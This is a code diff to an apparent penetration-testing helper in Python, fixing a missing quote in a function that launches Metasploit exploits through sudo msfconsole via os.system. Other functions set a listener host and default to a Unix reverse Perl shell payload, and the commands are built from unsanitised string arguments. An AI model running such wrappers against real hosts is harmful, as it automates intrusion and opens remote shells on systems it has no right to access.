@@ -6,7 +6,7 @@ def metasploit(exploit:str, rhost:str, lhost:str):
     return os.system(f'sudo msfconsole -q -x "use {exploit}; set rhosts {rhost}; set lhost {lhost};run"')
 
 def ftp(exploit:str, rhosts:str):
-    return os.system(f'sudo msfconsole -q -x "use {exploit}; set rhosts {rhosts};run')
+    return os.system(f'sudo msfconsole -q -x "use {exploit}; set rhosts {rhosts};run"')
 
 def other(exploit:str, rhost:str, lhost:str, payload:str="payload/cmd/unix/reverse_perl"):
     return os.system(f'sudo msfconsole -q -x "use {exploit}; set rhosts {rhost}; set lhost {lhost}; set payload {payload};run"')
